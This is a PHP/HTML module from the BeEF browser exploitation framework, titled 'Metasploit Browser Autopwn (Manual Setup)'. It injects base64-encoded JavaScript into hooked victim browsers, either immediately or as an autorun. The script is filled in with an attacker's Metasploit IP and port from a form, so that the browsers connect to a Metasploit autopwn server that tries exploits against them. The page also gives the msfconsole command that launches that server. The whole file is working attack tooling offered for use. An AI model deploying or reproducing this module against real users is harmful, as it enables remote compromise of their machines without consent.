<?
    // Copyright (c) 2006-2009, Wade Alcorn 
    // All Rights Reserved
    // wade@bindshell.net - http://www.bindshell.net
    //
    // Module by:   Joshua "Jabra" Abraham 
    // jabra@spl0it.org
    // http://blog.spl0it.org
    // 
	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	var rtnval = "Request Received";
    
    function get_b64_code_request() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		// replace sections of the code with user input
		b64code = b64replace(b64code, "MSF_IP",document.myform.msf_ip.value);
		b64code = b64replace(b64code, "MSF_PORT",document.myform.msf_port.value);

		return b64code;
	}
	
	Element.Methods.set_autorun = function() {
		ar.enable('Mozilla nsIProcess Interface', get_b64_code_request());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_request());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<div id="module_header">Metasploit Browser Autopwn (Manual Setup)</div>
<div class="entry">
	This exploit requires an RC file for Metasploit. Unlike the other Metasploit modules, 
    this one requires the manual setup of the autopwn module.<br><br>
    Metasploit Autopwn RC File:<a href="../modules/browser/msf_autopwn/beef.rc"> beef.rc </a><br>
    <pre>
        sudo ./msfconsole -r beef.rc
    </pre>
</div>
<div id="module_subsection"> 
	<form name="myform">
		<div id="module_subsection_header">Metasploit Autopwn IP</div>
		<input type="text" name="msf_ip" value="10.0.0.100"/>
		<div id="module_subsection_header">Metasploit Autopwn Port</div>
		<input type="text" name="msf_port" value="9000"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/><br>
	</form>
</div>

